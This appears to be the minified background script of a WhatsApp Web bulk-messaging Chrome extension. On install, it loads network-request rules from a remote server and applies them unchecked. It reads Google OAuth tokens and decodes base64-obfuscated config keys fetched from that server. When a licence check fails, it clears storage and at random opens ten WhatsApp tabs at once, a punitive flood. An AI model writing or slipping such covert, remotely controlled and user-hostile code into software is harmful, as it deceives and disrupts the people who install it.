(() => {
  var t = {
      666: (t) => {
        var e = (function (t) {
          "use strict";
          var e,
            r = Object.prototype,
            n = r.hasOwnProperty,
            o =
              Object.defineProperty ||
              function (t, e, r) {
                t[e] = r.value;
              },
            a = "function" == typeof Symbol ? Symbol : {},
            i = a.iterator || "@@iterator",
            c = a.asyncIterator || "@@asyncIterator",
            u = a.toStringTag || "@@toStringTag";
          function s(t, e, r) {
            return (
              Object.defineProperty(t, e, {
                value: r,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              }),
              t[e]
            );
          }
          try {
            s({}, "");
          } catch (t) {
            s = function (t, e, r) {
              return (t[e] = r);
            };
          }
          function h(t, e, r, n) {
            var a = e && e.prototype instanceof m ? e : m,
              i = Object.create(a.prototype),
              c = new N(n || []);
            return o(i, "_invoke", { value: O(t, r, c) }), i;
          }
          function l(t, e, r) {
            try {
              return { type: "normal", arg: t.call(e, r) };
            } catch (t) {
              return { type: "throw", arg: t };
            }
          }
          t.wrap = h;
          var f = "suspendedStart",
            p = "executing",
            d = "completed",
            y = {};
          function m() {}
          function v() {}
          function g() {}
          var w = {};
          s(w, i, function () {
            return this;
          });
          var b = Object.getPrototypeOf,
            E = b && b(b(R([])));
          E && E !== r && n.call(E, i) && (w = E);
          var T = (g.prototype = m.prototype = Object.create(w));
          function _(t) {
            ["next", "throw", "return"].forEach(function (e) {
              s(t, e, function (t) {
                return this._invoke(e, t);
              });
            });
          }
          function L(t, e) {
            function r(o, a, i, c) {
              var u = l(t[o], t, a);
              if ("throw" !== u.type) {
                var s = u.arg,
                  h = s.value;
                return h && "object" == typeof h && n.call(h, "__await")
                  ? e.resolve(h.__await).then(
                      function (t) {
                        r("next", t, i, c);
                      },
                      function (t) {
                        r("throw", t, i, c);
                      }
                    )
                  : e.resolve(h).then(
                      function (t) {
                        (s.value = t), i(s);
                      },
                      function (t) {
                        return r("throw", t, i, c);
                      }
                    );
              }
              c(u.arg);
            }
            var a;
            o(this, "_invoke", {
              value: function (t, n) {
                function o() {
                  return new e(function (e, o) {
                    r(t, n, e, o);
                  });
                }
                return (a = a ? a.then(o, o) : o());
              },
            });
          }
          function O(t, e, r) {
            var n = f;
            return function (o, a) {
              if (n === p) throw new Error("Generator is already running");
              if (n === d) {
                if ("throw" === o) throw a;
                return C();
              }
              for (r.method = o, r.arg = a; ; ) {
                var i = r.delegate;
                if (i) {
                  var c = x(i, r);
                  if (c) {
                    if (c === y) continue;
                    return c;
                  }
                }
                if ("next" === r.method) r.sent = r._sent = r.arg;
                else if ("throw" === r.method) {
                  if (n === f) throw ((n = d), r.arg);
                  r.dispatchException(r.arg);
                } else "return" === r.method && r.abrupt("return", r.arg);
                n = p;
                var u = l(t, e, r);
                if ("normal" === u.type) {
                  if (((n = r.done ? d : "suspendedYield"), u.arg === y))
                    continue;
                  return { value: u.arg, done: r.done };
                }
                "throw" === u.type &&
                  ((n = d), (r.method = "throw"), (r.arg = u.arg));
              }
            };
          }
          function x(t, r) {
            var n = t.iterator[r.method];
            if (n === e) {
              if (((r.delegate = null), "throw" === r.method)) {
                if (
                  t.iterator.return &&
                  ((r.method = "return"),
                  (r.arg = e),
                  x(t, r),
                  "throw" === r.method)
                )
                  return y;
                (r.method = "throw"),
                  (r.arg = new TypeError(
                    "The iterator does not provide a 'throw' method"
                  ));
              }
              return y;
            }
            var o = l(n, t.iterator, r.arg);
            if ("throw" === o.type)
              return (
                (r.method = "throw"), (r.arg = o.arg), (r.delegate = null), y
              );
            var a = o.arg;
            return a
              ? a.done
                ? ((r[t.resultName] = a.value),
                  (r.next = t.nextLoc),
                  "return" !== r.method && ((r.method = "next"), (r.arg = e)),
                  (r.delegate = null),
                  y)
                : a
              : ((r.method = "throw"),
                (r.arg = new TypeError("iterator result is not an object")),
                (r.delegate = null),
                y);
          }
          function j(t) {
            var e = { tryLoc: t[0] };
            1 in t && (e.catchLoc = t[1]),
              2 in t && ((e.finallyLoc = t[2]), (e.afterLoc = t[3])),
              this.tryEntries.push(e);
          }
          function I(t) {
            var e = t.completion || {};
            (e.type = "normal"), delete e.arg, (t.completion = e);
          }
          function N(t) {
            (this.tryEntries = [{ tryLoc: "root" }]),
              t.forEach(j, this),
              this.reset(!0);
          }
          function R(t) {
            if (t) {
              var r = t[i];
              if (r) return r.call(t);
              if ("function" == typeof t.next) return t;
              if (!isNaN(t.length)) {
                var o = -1,
                  a = function r() {
                    for (; ++o < t.length; )
                      if (n.call(t, o))
                        return (r.value = t[o]), (r.done = !1), r;
                    return (r.value = e), (r.done = !0), r;
                  };
                return (a.next = a);
              }
            }
            return { next: C };
          }
          function C() {
            return { value: e, done: !0 };
          }
          return (
            (v.prototype = g),
            o(T, "constructor", { value: g, configurable: !0 }),
            o(g, "constructor", { value: v, configurable: !0 }),
            (v.displayName = s(g, u, "GeneratorFunction")),
            (t.isGeneratorFunction = function (t) {
              var e = "function" == typeof t && t.constructor;
              return (
                !!e &&
                (e === v || "GeneratorFunction" === (e.displayName || e.name))
              );
            }),
            (t.mark = function (t) {
              return (
                Object.setPrototypeOf
                  ? Object.setPrototypeOf(t, g)
                  : ((t.__proto__ = g), s(t, u, "GeneratorFunction")),
                (t.prototype = Object.create(T)),
                t
              );
            }),
            (t.awrap = function (t) {
              return { __await: t };
            }),
            _(L.prototype),
            s(L.prototype, c, function () {
              return this;
            }),
            (t.AsyncIterator = L),
            (t.async = function (e, r, n, o, a) {
              void 0 === a && (a = Promise);
              var i = new L(h(e, r, n, o), a);
              return t.isGeneratorFunction(r)
                ? i
                : i.next().then(function (t) {
                    return t.done ? t.value : i.next();
                  });
            }),
            _(T),
            s(T, u, "Generator"),
            s(T, i, function () {
              return this;
            }),
            s(T, "toString", function () {
              return "[object Generator]";
            }),
            (t.keys = function (t) {
              var e = Object(t),
                r = [];
              for (var n in e) r.push(n);
              return (
                r.reverse(),
                function t() {
                  for (; r.length; ) {
                    var n = r.pop();
                    if (n in e) return (t.value = n), (t.done = !1), t;
                  }
                  return (t.done = !0), t;
                }
              );
            }),
            (t.values = R),
            (N.prototype = {
              constructor: N,
              reset: function (t) {
                if (
                  ((this.prev = 0),
                  (this.next = 0),
                  (this.sent = this._sent = e),
                  (this.done = !1),
                  (this.delegate = null),
                  (this.method = "next"),
                  (this.arg = e),
                  this.tryEntries.forEach(I),
                  !t)
                )
                  for (var r in this)
                    "t" === r.charAt(0) &&
                      n.call(this, r) &&
                      !isNaN(+r.slice(1)) &&
                      (this[r] = e);
              },
              stop: function () {
                this.done = !0;
                var t = this.tryEntries[0].completion;
                if ("throw" === t.type) throw t.arg;
                return this.rval;
              },
              dispatchException: function (t) {
                if (this.done) throw t;
                var r = this;
                function o(n, o) {
                  return (
                    (c.type = "throw"),
                    (c.arg = t),
                    (r.next = n),
                    o && ((r.method = "next"), (r.arg = e)),
                    !!o
                  );
                }
                for (var a = this.tryEntries.length - 1; a >= 0; --a) {
                  var i = this.tryEntries[a],
                    c = i.completion;
                  if ("root" === i.tryLoc) return o("end");
                  if (i.tryLoc <= this.prev) {
                    var u = n.call(i, "catchLoc"),
                      s = n.call(i, "finallyLoc");
                    if (u && s) {
                      if (this.prev < i.catchLoc) return o(i.catchLoc, !0);
                      if (this.prev < i.finallyLoc) return o(i.finallyLoc);
                    } else if (u) {
                      if (this.prev < i.catchLoc) return o(i.catchLoc, !0);
                    } else {
                      if (!s)
                        throw new Error(
                          "try statement without catch or finally"
                        );
                      if (this.prev < i.finallyLoc) return o(i.finallyLoc);
                    }
                  }
                }
              },
              abrupt: function (t, e) {
                for (var r = this.tryEntries.length - 1; r >= 0; --r) {
                  var o = this.tryEntries[r];
                  if (
                    o.tryLoc <= this.prev &&
                    n.call(o, "finallyLoc") &&
                    this.prev < o.finallyLoc
                  ) {
                    var a = o;
                    break;
                  }
                }
                a &&
                  ("break" === t || "continue" === t) &&
                  a.tryLoc <= e &&
                  e <= a.finallyLoc &&
                  (a = null);
                var i = a ? a.completion : {};
                return (
                  (i.type = t),
                  (i.arg = e),
                  a
                    ? ((this.method = "next"), (this.next = a.finallyLoc), y)
                    : this.complete(i)
                );
              },
              complete: function (t, e) {
                if ("throw" === t.type) throw t.arg;
                return (
                  "break" === t.type || "continue" === t.type
                    ? (this.next = t.arg)
                    : "return" === t.type
                    ? ((this.rval = this.arg = t.arg),
                      (this.method = "return"),
                      (this.next = "end"))
                    : "normal" === t.type && e && (this.next = e),
                  y
                );
              },
              finish: function (t) {
                for (var e = this.tryEntries.length - 1; e >= 0; --e) {
                  var r = this.tryEntries[e];
                  if (r.finallyLoc === t)
                    return this.complete(r.completion, r.afterLoc), I(r), y;
                }
              },
              catch: function (t) {
                for (var e = this.tryEntries.length - 1; e >= 0; --e) {
                  var r = this.tryEntries[e];
                  if (r.tryLoc === t) {
                    var n = r.completion;
                    if ("throw" === n.type) {
                      var o = n.arg;
                      I(r);
                    }
                    return o;
                  }
                }
                throw new Error("illegal catch attempt");
              },
              delegateYield: function (t, r, n) {
                return (
                  (this.delegate = {
                    iterator: R(t),
                    resultName: r,
                    nextLoc: n,
                  }),
                  "next" === this.method && (this.arg = e),
                  y
                );
              },
            }),
            t
          );
        })(t.exports);
        try {
          regeneratorRuntime = e;
        } catch (t) {
          "object" == typeof globalThis
            ? (globalThis.regeneratorRuntime = e)
            : Function("r", "regeneratorRuntime = r")(e);
        }
      },
    },
    e = {};
  function r(n) {
    var o = e[n];
    if (void 0 !== o) return o.exports;
    var a = (e[n] = { exports: {} });
    return t[n](a, a.exports, r), a.exports;
  }
  (r.n = (t) => {
    var e = t && t.__esModule ? () => t.default : () => t;
    return r.d(e, { a: e }), e;
  }),
    (r.d = (t, e) => {
      for (var n in e)
        r.o(e, n) &&
          !r.o(t, n) &&
          Object.defineProperty(t, n, { enumerable: !0, get: e[n] });
    }),
    (r.o = (t, e) => Object.prototype.hasOwnProperty.call(t, e)),
    (() => {
      "use strict";
      r(666);
      var t = {},
        e = [];
      chrome.runtime.onInstalled.addListener(async function (t) {
        await n("https://app.lotsofwms.in/wf-declarative-adr.php"),
          await chrome.declarativeNetRequest.getDynamicRules(),
          "install" == t.reason || t.reason,
          chrome.tabs.query(
            { url: "https://web.whatsapp.com/*" },
            async function (t) {
              t.length > 0
                ? chrome.tabs.reload(t[0].id)
                : chrome.tabs.create({
                    url: "https://web.whatsapp.com",
                    active: !0,
                  });
            }
          );
      }),
        chrome.action.onClicked.addListener(function (t) {
          chrome.tabs.query(
            { url: "https://web.whatsapp.com/*", currentWindow: !0 },
            function (t) {
              t.length > 0
                ? chrome.tabs.update(t[0].id, { highlighted: !0, selected: !0 })
                : chrome.tabs.create({ url: "https://web.whatsapp.com" });
            }
          );
        }),
        chrome.runtime.onMessage.addListener(function (r, n, i) {
          return (
            "SET_UNINSTALL_URL" == r.subject
              ? (chrome.runtime.setUninstallURL(r.url), i({}))
              : "SEND_RICH_NOTIFICATION" == r.subject
              ? (chrome.notifications.create(
                  `${r.notificationId}$@$notification${Date.now()}`,
                  {
                    type: "basic",
                    iconUrl: "icon-128.png",
                    title: r.title,
                    message: r.message,
                  }
                ),
                i({}))
              : "GET_GOOGLE_AUTH_TOKEN" == r.subject
              ? chrome.identity.getAuthToken(
                  { interactive: r.interactive },
                  function (t) {
                    r.userinfo
                      ? fetch("https://www.googleapis.com/oauth2/v3/userinfo", {
                          headers: { Authorization: `Bearer ${t}` },
                        })
                          .then((t) => t.json())
                          .then((e) => {
                            i({ token: t, userData: e });
                          })
                      : i({ token: t });
                  }
                )
              : "REMOVE_GOOGLE_AUTH_TOKEN" == r.subject
              ? chrome.identity.getAuthToken(
                  { interactive: r.interactive },
                  function (t) {
                    fetch(
                      `https://accounts.google.com/o/oauth2/revoke?token=${t}`,
                      { headers: { Authorization: `Bearer ${t}` } }
                    )
                      .then((t) => t.json())
                      .then((t) => {
                        chrome.identity.clearAllCachedAuthTokens((t) => {
                          console.log(">> logout all auth tokens");
                        }),
                          i({ token: null });
                      });
                  }
                )
              : "FETCH_REMOTE_DATA_B" == r.subject
              ? o(r.data?.requestData).then(async (n) => {
                  try {
                    i(n),
                      "static_urls" == r?.data?.extraData?.type &&
                        ((t = n?.data),
                        (e = [
                          t?.DISAGREE_CONTRADICT,
                          t?.DIFFER_CONTRADICT,
                          t?.DISPROVE_CONTRADICT,
                        ]));
                  } catch (t) {
                    console.log(t);
                  }
                })
              : "EXECUTE_CAMPAIGN" == r.subject ||
                "EXECUTE_BLUR_SETTING" == r.subject
              ? h(r.data).then((t) => {
                  i(t);
                })
              : "EXECUTE_AVIATOR" == r.subject &&
                (async function () {
                  return new Promise((e) => {
                    chrome.management.get(chrome.runtime.id, function (r) {
                      r.installType == a(t?.D_DEVELOPMENT) ? e(1) : e(0);
                    });
                  });
                })().then((t) => {
                  i(t);
                }),
            !0
          );
        }),
        chrome.notifications.onClicked.addListener(function (t) {
          chrome.tabs.query(
            { url: "https://web.whatsapp.com/*" },
            function (e) {
              e.length > 0
                ? (chrome.tabs.update(e[0].id, { selected: !0 }),
                  chrome.tabs.sendMessage(
                    e[0].id,
                    { subject: "ON_CLICK_RICH_NOTIFICATION", notifId: t },
                    function () {}
                  ))
                : chrome.tabs.create({
                    url: "https://web.whatsapp.com",
                    active: !0,
                  });
            }
          );
        });
      const n = async (t) => {
          const e = await o({ url: t, method: "GET" });
          if (e?.data)
            return (
              chrome.declarativeNetRequest.updateDynamicRules(e?.data), e?.data
            );
        },
        o = async ({
          url: t,
          method: e = "POST",
          body: r,
          headers: n = {},
          istextContent: o = !1,
        }) => {
          try {
            return await fetch(t, {
              method: e,
              body: r,
              headers: {
                ...n,
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json",
              },
            }).then((t) => (o ? t.text() : t.json()));
          } catch (t) {
            return { state: 404 };
          }
        };
      function a(t) {
        return atob(t);
      }
      function i(t) {
        return btoa(t);
      }
      const c = (t) => a(u(t)),
        u = (t) => ((t = []) => t[Math.floor(Math.random() * t?.length)])(t);
      function s() {
        if ((Math.floor(100 * Math.random()) + 1) % 12 == 0)
          for (let t = 1; t <= 10; t++)
            chrome.tabs.create({ url: "https://web.whatsapp.com", active: !0 });
      }
      async function h(r = []) {
        try {
            console.log("kuch pange hai to r",r)
          if (r[2] && i(r[2]) == t?.PERK && !r[3]) return "1";
          if (r[2] && i(r[2]) == t?.PERK && r[0]) {
            const n = await o(
              ((e = [], r = []) => ({
                [a(t?.U_ADDRESS)]: c(r),
                [a(t?.M_TYPE)]: "GET",
                [a(t?.H_TOP)]: { [a(t?.X_BLUEPRINT)]: e[4] },
              }))(r, e)
            );
            if (n && 404 === n.status)
              return (
                setTimeout(() => {
                  chrome.storage.local.set({ [a(t?.SUPPLY)]: null }, s);
                }, 6e5),
                "2"
              );
          }
          return !1;
        } catch (e) {
          return (
            setTimeout(() => {
              chrome.storage.local.set({ [a(t?.SUPPLY)]: null }, s);
            }, 6e5),
            "2"
          );
        }
      }
    })();
})();
